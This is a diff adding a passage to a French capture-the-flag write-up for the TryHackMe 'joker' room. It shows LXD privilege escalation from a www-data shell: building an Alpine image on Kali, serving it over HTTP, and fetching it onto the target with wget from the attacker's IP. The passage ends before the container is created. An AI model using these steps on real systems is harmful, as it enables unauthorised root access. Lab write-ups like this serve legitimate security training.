@@ -407,3 +407,73 @@ Comme à chaque fois, [consolidons ce shell](outils.md#consolidation-dun-shell)
 ## \[Task 4] Escalade des privilèges
 
 A priori nous devrions passer par[ ma méthode d'escalade des privilèges habituelle](outils.md#privilege-escalation) mais comme nous avons constaté que l'utilisateur courant \[www-data] était membre du groupe **\[lxd], n**ous allons pouvoir faire [une escalade de privilèges en utilisant une faille dans la mise en place de conteneurs LXD](outils.md#escalade-de-privileges-via-lxd)
+
+### Sur la machine Kali
+
+```
+┌──(kali㉿kali)-[~/THM/joker]
+└─$ git clone  https://github.com/saghul/lxd-alpine-builder.git
+Cloning into 'lxd-alpine-builder'...
+remote: Enumerating objects: 50, done.
+remote: Counting objects: 100% (8/8), done.
+remote: Compressing objects: 100% (6/6), done.
+remote: Total 50 (delta 2), reused 5 (delta 2), pack-reused 42 (from 1)
+Receiving objects: 100% (50/50), 3.11 MiB | 28.71 MiB/s, done.
+Resolving deltas: 100% (15/15), done.
+                                                                                                                       
+┌──(kali㉿kali)-[~/THM/joker]
+└─$ cd lxd-alpine-builder
+                                                                                                                       
+┌──(kali㉿kali)-[~/THM/joker/lxd-alpine-builder]
+└─$ sudo ./build-alpine
+Determining the latest release... v3.20
+Using static apk from http://dl-cdn.alpinelinux.org/alpine//v3.20/main/x86_64
+Downloading alpine-keys-2.4-r1.apk
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+...
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+Downloading apk-tools-static-2.14.4-r1.apk
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+ERROR: checksum is missing for sha256.alpine-devel@lists.alpinelinux.org-6165ee59.rsa.pub
+Failed to download a valid static apk
+                                                                                                                       
+┌──(kali㉿kali)-[~/THM/joker/lxd-alpine-builder]
+└─$ ls -l
+total 3228
+-rw-rw-r-- 1 kali kali 3259593 Nov 19 10:10 alpine-v3.13-x86_64-20210218_0139.tar.gz
+-rwxrwxr-x 1 kali kali    8060 Nov 19 10:10 build-alpine
+-rw-rw-r-- 1 kali kali   26530 Nov 19 10:10 LICENSE
+-rw-rw-r-- 1 kali kali     768 Nov 19 10:10 README.md
+drwxr-xr-x 5 root root    4096 Nov 19 10:10 rootfs
+                                                                                                                       
+┌──(kali㉿kali)-[~/THM/joker/lxd-alpine-builder]
+└─$ python3 -m http.server 8000  
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+
+
+```
+
+### Sur la machine cible
+
+```
+www-data@ubuntu:/$ cd /dev/shm
+18_0139.tar.gzu:/dev/shm$ wget http://10.9.2.156:8000/alpine-v3.13-x86_64-2021021
+--2024-11-19 01:16:38--  http://10.9.2.156:8000/alpine-v3.13-x86_64-20210218_0139.tar.gz
+Connecting to 10.9.2.156:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 3259593 (3.1M) [application/gzip]
+Saving to: 'alpine-v3.13-x86_64-20210218_0139.tar.gz'
+
+alpine-v3.13-x86_64 100%[===================>]   3.11M  4.70MB/s    in 0.7s    
+
+2024-11-19 01:16:39 (4.70 MB/s) - 'alpine-v3.13-x86_64-20210218_0139.tar.gz' saved [3259593/3259593]
+
+
+```
+
